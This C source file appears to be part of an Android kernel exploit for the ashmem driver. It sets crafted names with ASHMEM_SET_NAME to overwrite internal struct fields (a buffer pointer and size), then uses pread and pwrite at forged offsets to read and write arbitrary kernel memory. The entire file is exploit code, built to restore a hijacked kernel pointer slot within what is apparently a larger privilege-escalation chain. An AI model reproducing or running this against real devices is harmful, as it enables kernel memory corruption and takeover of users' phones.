#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/stat.h>

#ifndef ASHMEM_NAME_LEN
#define ASHMEM_NAME_LEN 256
#endif
#ifndef __ASHMEMIOC
#define __ASHMEMIOC 0x77
#endif
#define ASHMEM_SET_NAME _IOW(__ASHMEMIOC, 1, char[ASHMEM_NAME_LEN])

#define NAME_BIAS 11
#define CFG_BIN_BUFFER_OFF 88
#define CFG_BIN_BUFFER_SIZE_OFF 96
#define CFG_CB_MAX_SIZE_OFF 100

static void put64(unsigned char *p, size_t off, uint64_t v) {
  memcpy(p + off, &v, 8);
}
static void put32(unsigned char *p, size_t off, uint32_t v) {
  memcpy(p + off, &v, 4);
}

static int forge_write(int fd, uintptr_t target, size_t len) {
  unsigned char raw[128];
  memset(raw, 0, sizeof(raw));
  put64(raw, CFG_BIN_BUFFER_OFF - NAME_BIAS, target);
  put32(raw, CFG_BIN_BUFFER_SIZE_OFF - NAME_BIAS, (uint32_t)len);
  put32(raw, CFG_CB_MAX_SIZE_OFF - NAME_BIAS, 0);
  unsigned char nm[ASHMEM_NAME_LEN];
  memset(nm, 0x20, sizeof(nm));
  for (int i = 0; i < 128; i++) {
    nm[i] = raw[i] ? raw[i] : 0x20;
  }
  if (ioctl(fd, ASHMEM_SET_NAME, nm) != 0) {
    return -1;
  }
  for (int i = 128; i > 0; i--) {
    if (raw[i - 1] != 0) {
      continue;
    }
    unsigned char z[ASHMEM_NAME_LEN];
    memset(z, 0x20, sizeof(z));
    for (int k = 0; k < i - 1; k++) {
      z[k] = raw[k] ? raw[k] : 0x20;
    }
    z[i - 1] = 0;
    ioctl(fd, ASHMEM_SET_NAME, z);
  }
  return 0;
}

static int open_ash(char *path, size_t plen) {
  int fd = open("/dev/ashmem", O_RDWR | O_CLOEXEC);
  if (fd < 0 || 1) {
    char bid[128];
    int bf = open("/proc/sys/kernel/random/boot_id", O_RDONLY | O_CLOEXEC);
    if (bf >= 0) {
      ssize_t n = read(bf, bid, sizeof(bid) - 1);
      close(bf);
      if (n > 0) {
        bid[strcspn(bid, "\r\n")] = 0;
        snprintf(path, plen, "/dev/ashmem/%s", bid);
        int fd2 = open(path, O_RDWR | O_CLOEXEC);
        if (fd2 >= 0) {
          if (fd >= 0) {
            close(fd);
          }
          fd = fd2;
        }
      }
    }
  }
  return fd;
}

int main(int argc, char **argv) {
  if (argc < 3) {
    printf("usage: %s <slot_va_hex> <orig_va_hex>\n", argv[0]);
    return 2;
  }
  uintptr_t slot = strtoull(argv[1], NULL, 16);
  uintptr_t orig = strtoull(argv[2], NULL, 16);
  if (!slot || !orig) {
    printf("bad args\n");
    return 2;
  }
  char path[256] = "/dev/ashmem";
  int fd = open_ash(path, sizeof(path));
  if (fd < 0) {
    printf("open ashmem failed errno=%d\n", errno);
    return 2;
  }
  printf("ashmem fd=%d path=%s\n", fd, path);

  unsigned char raw[128];
  memset(raw, 0, sizeof(raw));
  uint64_t count = 0x6d6873612f766564ULL;
  off_t pos = (off_t)(count - 8);
  uint64_t page_val = slot - (uint64_t)pos;
  memcpy(raw + (16 - NAME_BIAS), &page_val, 8);
  unsigned char nm[ASHMEM_NAME_LEN];
  memset(nm, 0x20, sizeof(nm));
  for (int i = 0; i < 128; i++) {
    nm[i] = raw[i] ? raw[i] : 0x20;
  }
  ioctl(fd, ASHMEM_SET_NAME, nm);
  for (int i = 128; i > 0; i--) {
    if (raw[i - 1] != 0) {
      continue;
    }
    unsigned char z[ASHMEM_NAME_LEN];
    memset(z, 0x20, sizeof(z));
    for (int k = 0; k < i - 1; k++) {
      z[k] = raw[k] ? raw[k] : 0x20;
    }
    z[i - 1] = 0;
    ioctl(fd, ASHMEM_SET_NAME, z);
  }
  uint64_t cur = 0;
  ssize_t rd = pread(fd, &cur, 8, pos);
  printf("slot pre-read rd=%zd value=%016llx\n", rd,
         (unsigned long long)cur);
  if (rd != 8 || cur < 0xffffff8000000000ULL || cur >= 0xffffffff00000000ULL) {
    printf("slot not in hijacked state (or wrong slide) - refusing\n");
    close(fd);
    return 1;
  }

  if (forge_write(fd, slot, 8) != 0) {
    printf("forge write buffer failed\n");
    close(fd);
    return 1;
  }
  ssize_t wr = pwrite(fd, &orig, 8, 0);
  printf("pwrite wr=%zd errno=%d\n", wr, errno);

  memset(raw, 0, sizeof(raw));
  memcpy(raw + (16 - NAME_BIAS), &page_val, 8);
  memset(nm, 0x20, sizeof(nm));
  for (int i = 0; i < 128; i++) {
    nm[i] = raw[i] ? raw[i] : 0x20;
  }
  ioctl(fd, ASHMEM_SET_NAME, nm);
  for (int i = 128; i > 0; i--) {
    if (raw[i - 1] != 0) {
      continue;
    }
    unsigned char z[ASHMEM_NAME_LEN];
    memset(z, 0x20, sizeof(z));
    for (int k = 0; k < i - 1; k++) {
      z[k] = raw[k] ? raw[k] : 0x20;
    }
    z[i - 1] = 0;
    ioctl(fd, ASHMEM_SET_NAME, z);
  }
  uint64_t now = 0;
  rd = pread(fd, &now, 8, pos);
  printf("slot post-read rd=%zd value=%016llx %s\n", rd,
         (unsigned long long)now,
         now == orig ? "RESTORED" : "MISMATCH");
  close(fd);
  return now == orig ? 0 : 1;
}
